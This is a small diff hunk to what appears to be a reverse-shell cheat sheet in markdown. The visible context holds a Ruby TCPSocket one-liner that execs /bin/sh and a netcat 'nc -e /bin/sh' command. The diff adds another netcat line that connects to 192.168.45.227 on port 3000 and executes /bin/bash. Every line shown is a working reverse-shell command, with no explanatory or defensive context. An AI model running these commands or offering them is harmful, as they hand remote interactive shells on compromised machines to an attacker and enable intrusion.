@@ -270,6 +270,9 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i
 
 ```
 nc -e /bin/sh 10.0.0.5 1234
+
+nc -nv 192.168.45.227 3000 -e /bin/bash
+
 ```
 
 ```
